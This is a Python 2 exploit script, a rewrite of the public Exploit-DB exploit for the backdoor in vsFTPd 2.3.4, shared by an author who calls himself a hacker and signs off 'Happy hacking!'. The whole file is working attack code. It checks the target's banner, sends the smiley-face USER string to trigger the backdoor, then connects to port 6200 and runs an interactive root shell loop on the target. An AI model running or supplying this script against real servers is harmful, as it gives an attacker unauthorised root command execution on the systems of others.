#! /usr/bin/python
 
#This is an exploit that will trigger the backdoor planted in vsFTPd 2.3.4
#A hacker by the Defalt (me) needed something to help practice Python, so I re-wrote this exploit
#Original exploit (Exploit-DB) --> https://www.exploit-db.com/exploits/17491/
#This isn't anything new, but it's the first exploit I've re-wrote, so I felt like sharing
#Happy hacking!
 
import socket
import sys
import time
 
if len(sys.argv) < 3:
    print "usage: ./vsftpd_backdoor_sploit.py [TARGET IP] [TARGET PORT]"
    print "\nThis exploit triggers a backdoor planted in vsftpd version 2.3.4"
    print "\nExploit-DB: https://www.exploit-db.com/exploits/17491/"
    sys.exit(1)
 
target = sys.argv[1]
port = sys.argv[2]
 
def trigger():
    trigger_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        print '[*] Connecting to Target... '
        trigger_socket.connect((target, int(port)))
    except Exception:
        print '[!] Connection to Target Failed\n'
        sys.exit(1)
    banner = trigger_socket.recv(1024)
    print '[*] Checking for Backdoored Service... '
    if "vsFTPd 2.3.4" not in banner:
        print '[!] Non-backdoored vsFTPd Version Detected\n'
        trigger_socket.close()
        sys.exit(1)
    try:
        print '[*] Attempting to Trigger Backdoor... '
        trigger_socket.send('USER backdoored:)\n') #Initiate backdoor trigger
        res = trigger_socket.recv(1024)
        trigger_socket.send('PASS invalid\n') #Trigger backdoor
        time.sleep(3)
    except Exception:
        print '\n[!] Failed to Trigger Backdoor\n'
        sys.exit(1)
    return trigger_socket
 
def handle(trig_sock=trigger()):
    print '[*] Backdoor Triggered, Connecting to Shell... '
    shell_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        shell_socket.connect((target, 6200))
    except Exception:
        print '\n[!] Failed to Connect to Shell\n'
        sys.exit(1)
    print '[*] Connected to Shell, Starting Interaction...'
    shell_socket.send('whoami\n')
    res = shell_socket.recv(1024)
    if 'root' in res:
        print '[*] Root Shell Spawned, Interaction Started\n\n'
    shell_socket.settimeout(1.5)
    while 1:
        try:
            command = raw_input('# ').strip()
            if command == 'exit':
                shell_socket.close()
                trig_sock.close()
                return
            shell_socket.send(command + '\n')
            try:
                print shell_socket.recv(1024)
            except socket.timeout:
                pass
        except KeyboardInterrupt:
            shell_socket.close()
            trig_sock.close()
            return
        except Exception:
            shell_socket.close()
            trig_sock.close()
            print '\n[!] An Error Occured During Shell Interaction'
            sys.exit(1)
 
try:
    handle()
except KeyboardInterrupt:
    print '\n[!] Attacker Interrupted Exploit'
    sys.exit(1)

